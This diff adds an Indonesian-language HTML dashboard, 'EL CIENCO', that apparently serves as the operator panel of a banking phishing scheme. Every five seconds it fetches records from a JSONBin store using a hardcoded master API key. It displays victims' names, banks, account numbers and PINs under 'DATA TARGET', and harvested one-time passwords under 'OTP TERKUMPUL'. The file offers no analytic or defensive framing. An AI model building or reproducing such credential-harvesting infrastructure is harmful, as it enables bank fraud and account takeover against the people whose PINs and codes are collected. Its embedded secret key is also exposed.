@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EL CIENCO Dashboard</title>
+    <style>
+        body {
+            font-family: monospace;
+            background: #0a0e27;
+            color: #00ff88;
+            padding: 20px;
+        }
+        .card {
+            background: #0f1233;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid #1a1f4e;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th, td {
+            text-align: left;
+            padding: 10px;
+            border-bottom: 1px solid #1a1f4e;
+        }
+        th {
+            color: #8888ff;
+        }
+        .otp {
+            background: #ff8800;
+            color: black;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-weight: bold;
+        }
+        button {
+            background: #00ff88;
+            color: #0a0e27;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔴 EL CIENCO DASHBOARD</h1>
+    <p>Data dari JSONBin | Realtime</p>
+
+    <div class="card">
+        <h3>📊 DATA TARGET</h3>
+        <div id="targetsTable">Loading...</div>
+    </div>
+
+    <div class="card">
+        <h3>🔑 OTP TERKUMPUL</h3>
+        <div id="otpsTable">Loading...</div>
+    </div>
+
+    <button onclick="refreshData()">🔄 Refresh</button>
+
+    <script>
+        const BIN_ID = '69e10549856a6821893f4a1f';
+        const API_KEY = '$2a$10$AvgpqyavBNfTF0W1KA6mIeFfTVXZfCU/2kdYCu64PjoqhYZCH.WUO';
+        const URL = `https://api.jsonbin.io/v3/b/${BIN_ID}/latest`;
+
+        async function fetchData() {
+            try {
+                const res = await fetch(URL, {
+                    headers: { 'X-Master-Key': API_KEY }
+                });
+                const json = await res.json();
+                const record = json.record || { targets: [], otps: [] };
+                
+                // Tampilkan data target
+                let targetsHtml = '<table><tr><th>Waktu</th><th>Nama</th><th>Bank</th><th>Rekening</th><th>PIN</th></tr>';
+                record.targets.forEach(t => {
+                    targetsHtml += `<tr>
+                        <td>${new Date(t.timestamp).toLocaleString()}</td>
+                        <td>${t.fullName || '-'}</td>
+                        <td>${t.bankType || '-'}</td>
+                        <td>${t.accountNumber || '-'}</td>
+                        <td>${t.pin || '-'}</td>
+                    </tr>`;
+                });
+                targetsHtml += '</table>';
+                document.getElementById('targetsTable').innerHTML = targetsHtml;
+                
+                // Tampilkan OTP
+                let otpsHtml = '<table><tr><th>Waktu</th><th>OTP</th></tr>';
+                record.otps.forEach(o => {
+                    otpsHtml += `<tr>
+                        <td>${new Date(o.timestamp).toLocaleString()}</td>
+                        <td><span class="otp">${o.otp}</span></td>
+                    </tr>`;
+                });
+                otpsHtml += '</table>';
+                document.getElementById('otpsTable').innerHTML = otpsHtml;
+                
+            } catch(e) {
+                document.getElementById('targetsTable').innerHTML = 'Error: ' + e.message;
+            }
+        }
+        
+        function refreshData() {
+            fetchData();
+        }
+        
+        fetchData();
+        setInterval(fetchData, 5000);
+    </script>
+</body>
+</html>
